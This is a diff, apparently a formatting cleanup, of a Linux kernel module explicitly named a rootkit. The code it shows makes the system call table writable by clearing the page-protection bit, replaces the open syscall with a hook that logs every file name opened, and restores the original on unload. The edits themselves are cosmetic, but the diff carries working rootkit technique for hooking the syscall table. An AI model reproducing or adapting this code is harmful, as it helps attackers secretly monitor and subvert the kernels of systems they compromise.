@@ -6,11 +6,11 @@
 
 unsigned long *sys_call_table = (void *)ROOTKIT_SYSCALL_TABLE_ADDR;
 
-asmlinkage int (*real_open)(const char* __user, int, int);
+asmlinkage int (*real_open)(const char __user *, int, int);
 
-asmlinkage int rootkit_open(const char* __user file_name, int flags, int mode)
+asmlinkage int rootkit_open(const char __user *file_name, int flags, int mode)
 {
-	printk("open(\"%s\", %X, %X)\n", file_name, flags, mode);
+	pr_info("open(\"%s\", %X, %X)\n", file_name, flags, mode);
 	return real_open(file_name, flags, mode);
 }
 
@@ -18,16 +18,17 @@ static void rootkit_set_table_rw(void)
 {
 	unsigned int lvel;
 	pte_t *p = lookup_address((unsigned long)sys_call_table, &lvel);
-	if (p->pte &~ _PAGE_RW) {
+
+	if (p->pte & ~_PAGE_RW)
 		p->pte |= _PAGE_RW;
-	}
 }
 
 static void rootkit_set_table_ro(void)
 {
 	unsigned int lvel;
 	pte_t *p = lookup_address((unsigned long)sys_call_table, &lvel);
-	p->pte = p->pte &~ _PAGE_RW;
+
+	p->pte = p->pte & ~_PAGE_RW;
 }
 
 static int __init rootkit_init(void)
@@ -42,7 +43,7 @@ static int __init rootkit_init(void)
 static void __exit rootkit_exit(void)
 {
 	rootkit_set_table_rw();
-        sys_call_table[__NR_open] = (unsigned long)real_open;
+	sys_call_table[__NR_open] = (unsigned long)real_open;
 	rootkit_set_table_ro();
 }
 
